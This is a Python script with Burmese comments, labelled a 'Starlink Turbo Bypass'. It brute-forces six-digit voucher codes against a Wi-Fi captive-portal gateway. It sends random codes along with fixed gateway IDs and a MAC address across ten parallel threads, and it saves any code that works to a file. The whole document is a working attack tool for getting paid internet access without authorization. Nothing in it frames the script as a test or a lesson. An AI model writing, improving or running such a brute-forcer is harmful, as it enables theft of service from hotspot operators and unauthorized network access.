import requests
import random
import time
import threading
import os

# အရောင်သတ်မှတ်ချက်များ
RED = '\033[91m'
GREEN = '\033[92m'
CYAN = '\033[96m'
WHITE = '\033[97m'
END = '\033[0m'

url = "http://10.44.77.240:2060/expire_tip"

def check_voucher():
    while True:
        # 6-digit code ထုတ်ယူခြင်း
        code = "".join([str(random.randint(0, 9)) for _ in range(6)])
        params = {
            'gw_id': '984a6ba4b7ef',
            'gw_sn': 'H1TB01V00212C',
            'gw_address': '192.168.110.1',
            'mac': 'a6:a9:6f:93:0b:bb',
            'voucher': code
        }

        try:
            # timeout ကို ၀.၅ စက္ကန့်အထိ လျှော့ချပြီး မြန်နှုန်းတင်ထားသည်
            res = requests.get(url, params=params, timeout=0.5)
            
            if "failed" in res.text.lower() or "expire" in res.text.lower():
                # ပုံထဲကအတိုင်း Fail Code ကို အနီရောင်ဖြင့်ပြသခြင်း
                print(f"{RED}Fail Code: {code}{END}")
            elif res.status_code == 200:
                print(f"{GREEN}[!] SUCCESS FOUND: {code}{END}")
                with open("success.txt", "a") as f:
                    f.write(f"Code: {code}\n")
                break
        except:
            pass

def start_turbo():
    os.system('clear')
    print(f"{CYAN}[+] Starlink Turbo Bypass: Active{END}")
    print(f"{CYAN}[+] Threads: 10 (Maximum Speed){END}")
    print(f"{CYAN}[+] Status: Scanning...{END}\n")
    
    # Threads ၁၀ ခု ပြိုင်တူ run မည်
    for i in range(10): 
        t = threading.Thread(target=check_voucher)
        t.start()

if __name__ == "__main__":
    start_turbo()
